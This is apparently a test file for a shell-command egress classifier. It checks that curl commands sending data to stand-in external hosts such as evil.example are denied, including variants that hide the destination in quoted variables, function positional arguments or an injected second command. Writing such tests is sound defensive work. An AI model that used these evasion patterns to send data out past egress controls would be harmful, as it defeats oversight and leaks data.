import { describe, expect, it } from 'vitest'
import { readFileSync } from 'node:fs'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

describe('direct function literal arguments', () => {
  it.each([
    [`post(){ echo $UNSET; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
    [`post(){ echo \${UNSET}; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
    [`post(){ echo fixed; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
    [`post(){ curl -d $1 http://localhost:3420/x; }; post 'payload https://external.invalid'`, true],
    [`post(){ echo $UNSET; curl -d "$1" "$2"; }; post 'two words' https://external.invalid`, true],
    [`V="'a b' https://evil.example/x"; f(){ curl -d hi "$3"; }; f $V`, true],
    [`sh -c 'echo fixed; curl "$1"' _ https://external.invalid`, true],
  ])('checks positional references at the current offset: %s', (cmd, deny) => {
    expect(classify(cmd).deny).toBe(deny)
  })

  it('preserves all F1 positive and twin decisions', () => {
    const rows = readFileSync(new URL('./fixtures/egress-corpus/families.jsonl', import.meta.url), 'utf8')
      .trim().split('\n').map((line) => JSON.parse(line))
    for (const row of rows.filter((r) => r.family === 'F1')) {
      expect(classify(row.cmd).deny, row.id).toBe(row.expect === 'deny')
    }
  })

  it.each([
    `post(){ curl -s -d "$1" http://localhost:3420/x; }; post '{"title":"two words"}'`,
    `post(){ curl -s -d "$1" "$2"; }; post '{"title":"two words"}' http://localhost:3420/x`,
    `post(){ curl "$@"; }; post -d '{"title":"two words"}' http://localhost:3420/x`,
    `post(){ curl -d "$*" http://localhost:3420/x; }; post hello world`,
    `post(){ local u="$2"; curl -d "$1" "$u"; }; post 'two words' http://localhost:3420/x`,
    `post(){ u="$2"; curl -d "$1" "$u"; }; post 'two words' http://localhost:3420/x`,
    `post(){ curl -d "$1" "$9"; }; post 'two words' a b c d e f g http://localhost:3420/x`,
    `post(){ curl -d "$1" http://localhost:3420/x; }; post "it's fine"`,
  ])('allows literal payload without reparsing it as a host: %s', (cmd) => {
    expect(classify(cmd)).toMatchObject({ deny: false })
  })

  it.each([
    `post(){ curl -d "$1" "$2"; }; post 'two words' https://external.invalid/x`,
    `post(){ curl -d "$1" "$2"; }; post 'two words' http://localhost:3420/x; post 'two words' https://external.invalid/x`,
    `post(){ local u="$2"; curl -d "$1" "$u"; }; post 'two words' https://external.invalid/x`,
    `post(){ curl "$@"; }; post -d 'two words' https://external.invalid/x`,
    `post(){ curl -d "$1" "$BASE"; }; post 'two words'`,
  ])('still classifies external or unresolved destinations: %s', (cmd) => {
    expect(classify(cmd).deny).toBe(true)
  })

  it.each([
    `V="'a b' https://evil.example/x"; f(){ curl -d hi "$3"; }; f $V`,
    `V="'a b' https://evil.example/x"; f(){ curl -d "$1" "$3"; }; f $V`,
    `V="'a b' evil.example"; f(){ curl -d "$1" "https://$3/x"; }; f $V`,
    `V='"a b" https://evil.example/x'; f(){ curl -d "$1" "$3"; }; f $V`,
    `V="'-d' 'a b' https://evil.example/x"; f(){ curl -d hi "$4"; }; f $V`,
  ])('rejects variable values whose quotes hide argument boundaries: %s', (cmd) => {
    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'function-positional' })
  })

  it.each([
    `post(){ shift; curl -d "$1" "$2"; }; post x 'two words' https://external.invalid`,
    `post(){ curl -d "$1" "$2"; }; post 'two words' $TARGET`,
    `post(){ curl -d "$1" "$2"; }; post 'two words' *.invalid`,
    `post(){ curl -d $1 http://localhost:3420/x; }; post 'payload https://external.invalid'`,
    `post(){ watch "\${1:-x}"; }; post 'curl https://external.invalid'`,
    `post(){ curl -d "$1" http://localhost:3420/x; }; post 'x; curl https://external.invalid'`,
  ])('retains conservative fallback outside literal binding: %s', (cmd) => {
    expect(classify(cmd)).toMatchObject({ deny: true, reason: 'function-positional' })
  })
})
